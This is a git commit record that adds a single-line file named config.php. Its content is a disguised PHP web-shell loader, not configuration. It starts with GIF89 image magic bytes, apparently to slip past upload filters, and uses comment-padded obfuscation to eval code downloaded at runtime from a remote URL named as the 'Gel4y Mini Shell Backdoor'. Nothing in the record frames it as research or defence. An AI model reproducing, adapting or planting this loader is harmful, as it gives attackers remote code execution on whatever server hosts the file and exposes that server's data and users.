59eb07e178c57a2dbb5e856ad189647d4393a8de
paknago21 <113289817+paknago21@users.noreply.github.com>
2023-06-04 06:05:16 +0700

    Add files via upload

---
+++ config.php
@@ -0,0 +1,1 @@
+GIF89;aGIF89;aGIF89;a<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://raw.githubusercontent.com/22XploiterCrew-Team/Gel4y-Mini-Shell-Backdoor/1.x.x/gel4y.php"));/**/?>
